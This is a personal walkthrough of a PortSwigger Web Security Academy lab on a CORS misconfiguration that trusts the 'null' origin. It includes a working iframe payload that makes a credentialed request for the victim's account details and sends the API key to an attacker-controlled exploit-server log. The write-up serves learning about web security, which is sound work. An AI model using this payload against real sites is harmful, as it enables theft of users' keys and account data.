# URL
https://portswigger.net/web-security/cors/lab-null-origin-whitelisted-attack
# Concept
* CORS vulnerability through Null origin
# Description
 This website has an insecure CORS configuration in that it trusts the "null" origin.

To solve the lab, craft some JavaScript that uses CORS to retrieve the administrator's API key and upload the code to your exploit server. The lab is solved when you successfully submit the administrator's API key.

You can log in to your own account using the following credentials: wiener:peter 
# Method of solve
* login to the app in the Burp Suite browser with our provided creds `wiener:peter`
* go back to the Burp Suite `HTTP History` tab, and observe that the `/acccountDetails` request returned our user's data in JSON form, such as `username` and `apikey`
* we also notice that the reponse included the `Access-Control-Allow-Credentials` response header, which could be clue that the app has a CORS vulnerability
* we try to confirm this by provided an `Origin` request header with an arbitrary value: `Origin: http://example.com`
* this does not reflect in the response
* but we recall that the name of the lab is called `null origin whitelist attack`
* so we instead include the value `null` with the `Origin` header: `Origin: null`
* when we send that, the `null` value is reflected in this header:
```
Access-Control-Allow-Origin: null
```
* this means that we might be able to extract data from the app by embedding an iframe into an attacker server's code:
```
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://<YOUR_LAB_SUBDOMAIN>.web-security-academy.net/accountDetails',true);
req.withCredentials = true;
req.send();

function reqListener() {
location='https://<YOUR_ATTACKER_SUBDOMAIN>.exploit-server.net/log?key='+encodeURIComponent(this.responseText);
};
</script>"></iframe>
```
* sandboxxed iframes with data automatcally send the `Origin: null` request header <-- from AI sources
* from here, we need to store the exploit code for the webpage, then send the exploit to the lab server
* in the exploit server logs, we should see a request to the `/log` endpoint with our desired user's JSON object that contains stuff like the `apikey` we're looking for








